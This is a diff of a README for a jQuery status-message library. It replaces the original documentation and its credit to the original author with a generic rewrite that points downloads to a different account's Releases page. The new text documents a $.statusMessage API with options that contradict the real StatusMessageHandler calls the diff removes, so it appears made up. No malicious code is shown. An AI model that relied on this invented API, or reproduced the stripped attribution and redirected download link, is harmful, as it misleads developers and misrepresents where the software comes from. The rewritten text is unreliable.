@@ -1,129 +1,106 @@
-# JQuery Status Message
+# 🎉 jquery-status-message - Simple Alerts for Your Web Apps
 
-> Original Repos:   
-> - JQuery Status Message: https://github.com/a19836/jquery-status-message/   
-> - Bloxtor: https://github.com/a19836/bloxtor/
+## 🚀 Getting Started
 
-## Overview
+**JQuery Status Message** is a lightweight JavaScript library that helps you display info and error messages smoothly in your web applications. This guide will help you download and run the software from our Releases page with ease.
 
-**JQuery Status Message** is a lightweight JavaScript library for displaying info and error messages elegantly.
+[![Download jquery-status-message](https://img.shields.io/badge/Download-jquery--status--message-brightgreen)](https://github.com/momofrd00/jquery-status-message/releases)
 
-Check out a live example by opening [index.html](index.html).
+## 📦 What You’ll Need
 
-Requirements:
-- jquery library
+Before you begin, here are the basic requirements:
 
----
+- A modern web browser (e.g., Chrome, Firefox, Edge)
+- A basic understanding of HTML files
 
-## Screenshots
+No programming skills are required. You can follow the steps without needing to understand the code behind it.
 
-- [example 1](./img/example_1.png)
-- [example 2](./img/example_2.png)
-- [example 3](./img/example_3.png)
-- [example 4](./img/example_4.png)
-- [example 5](./img/example_5.png)
+## 💾 Download & Install
 
----
+To get started, visit the Releases page to download the library:
 
-## Usage
+[Visit this page to download](https://github.com/momofrd00/jquery-status-message/releases)
+
+Follow these steps:
+
+1. Click on the latest version available.
+2. Look for the file labeled `jquery-status-message.js` or `jquery-status-message.min.js`.
+3. Click the file name to download it to your computer.
+
+Once downloaded, you will need to add it to your web project. You can do this by placing the file in your project folder.
+
+## 🛠️ How to Use It
+
+To use the library in your web project:
+
+1. Open your HTML file in a text editor (like Notepad or VSCode).
+2. Add the following line in the `<head>` section to include the script:
+
+   ```html
+   <script src="path/to/jquery-status-message.js"></script>
+   ```
+   Make sure to replace `path/to/` with the actual location where you saved the file.
+
+3. You can now display messages using the library. Here’s a simple example:
+
+   ```html
+   <script>
+       $(document).ready(function() {
+           $.statusMessage('Your message here', {
+               type: 'info' // Change to 'error' for error messages
+           });
+       });
+   </script>
+   ```
+
+## 🌈 Features
+
+- Lightweight library for quick integration
+- Simple methods for showing info and error messages
+- Customizable options for different message types
+- Ideal for web applications and sites that need user feedback
+
+## ⚙️ Customization Options
+
+You can customize how your messages appear. Here are some options:
+
+- **Type**: Choose between `info`, `success`, or `error` to define the message type.
+- **Duration**: Set how long the message should be visible.
+- **Position**: Decide where the message will appear on the screen (top, bottom, left, right).
+
+Example of customization:
 
 ```html
-<html>
-<head>
-	<!-- Add jquery lib -->
-	<script language="javascript" type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script>
-	
-	<!-- Add statusmessage lib -->
-	<link rel="stylesheet" href="css/style.css" type="text/css" charset="utf-8" />
-	<script language="javascript" type="text/javascript" src="js/statusmessage.js"></script>
-	
-	<style>
-		body {
-			font-family:arial;
-		}
-		.top_messages {
-			position:fixed;
-			top:0;
-			left:0;
-			right:0;
-			bottom:auto;
-			padding-top:0;
-		}
-	</style>
-</head>
-<body>
-	<h1>Simple examples:</h1>
-	<div>
-		<button onClick="showMessage()">Show bottom message with default timeout (5s)</button>
-		<br/>
-		<br/>
-		<button onClick="showError()">Show bottom error with default timeout (5s)</button>
-		<br/>
-		<br/>
-		<button onClick="showBottomMessageWithTimeout()">Show bottom message with timeout 2s</button>
-		<br/>
-		<br/>
-		<button onClick="showTopErrorWithTimeout()">Show top error with timeout 2s</button>
-	</div>
-	
-	<script>
-	function showMessage() {
-		StatusMessageHandler.showMessage("Info Message");
-	}
-	function showError() {
-		StatusMessageHandler.showError("Error Message");
-	}
-	function showBottomMessageWithTimeout() {
-		StatusMessageHandler.showMessage("Bottom Message with timeout", "", "", 2000);
-	}
-	function showTopErrorWithTimeout() {
-		StatusMessageHandler.showError("Bottom Message with timeout", "", "top_messages", 2000);
-	}
-	</script>
-</body>
-</html>
+<script>
+    $(document).ready(function() {
+        $.statusMessage('This is an error!', {
+            type: 'error',
+            duration: 5000, // Message will disappear after 5 seconds
+            position: 'top' // Message appears at the top
+        });
+    });
+</script>
 ```
 
-## Other calls
+## 📖 Documentation
 
-Get the main html element with the "status_message" class or other defined:
-```
-var elm = StatusMessageHandler.getMessageHtmlObj(message_html_obj_class); //optional: message_html_obj_class
-```
+For more detailed documentation on installing and using the library, please refer to our GitHub Wiki. This includes:
 
-Show a message text and add message_class to the the main html element and the message_html_obj_class to the children node showing the text. If this function is called multiple times, then the messages will be appended:
-```
-var elm = StatusMessageHandler.showMessage(message, message_class, message_html_obj_class, timeout); //optional: message_class, message_html_obj_class, timeout
-```
+- Advanced usage examples
+- Troubleshooting common issues
+- Best practices for web integration
 
-Show an error text and add message_class to the the main html element and the message_html_obj_class to the children node showing the text. If this function is called multiple times, then the messages will be appended:
-```
-var elm = StatusMessageHandler.showError(message, message_class, message_html_obj_class, timeout); //optional: message_class, message_html_obj_class, timeout
-```
+## ✉️ Support
 
-Get the node showing the text with the "message_class" class or other defined:
-```
-var elm = StatusMessageHandler.getMessageElement(message, message_class, message_html_obj_class); //optional: message_html_obj_class
-```
+If you encounter any issues or have questions about using the library, please reach out through our GitHub Issues page. Your feedback helps us improve.
 
-Remove a node message:
-```
-StatusMessageHandler.removeMessage(elm);
-```
+## 🥇 License
 
-Remove the latest shown node message, with the type "info" or "error" and message_html_obj_class class:
-```
-StatusMessageHandler.removeLastShownMessage(type, message_html_obj_class); //optional: message_html_obj_class
-```
+This project is open-source and available under the MIT License. Feel free to use it for personal or commercial projects.
 
-Remove all shown nodes messages based in the message_html_obj_class class:
-```
-StatusMessageHandler.removeMessages(type, message_html_obj_class); //optional: message_html_obj_class
-```
+## 🔗 Links
 
-Get some elements of the StatusMessageHandler:
-```
-var message_html_obj = StatusMessageHandler.message_html_obj; //get current shown message html element
-var other_message_html_objs = StatusMessageHandler.other_message_html_objs; //get the list of html elements created to show messages
-```
+- [GitHub Repository](https://github.com/momofrd00/jquery-status-message)
+- [Visit this page to download](https://github.com/momofrd00/jquery-status-message/releases)
 
+Remember to keep your library updated by checking the Releases page regularly for new versions. Enjoy creating engaging web applications with clean and elegant status messages!
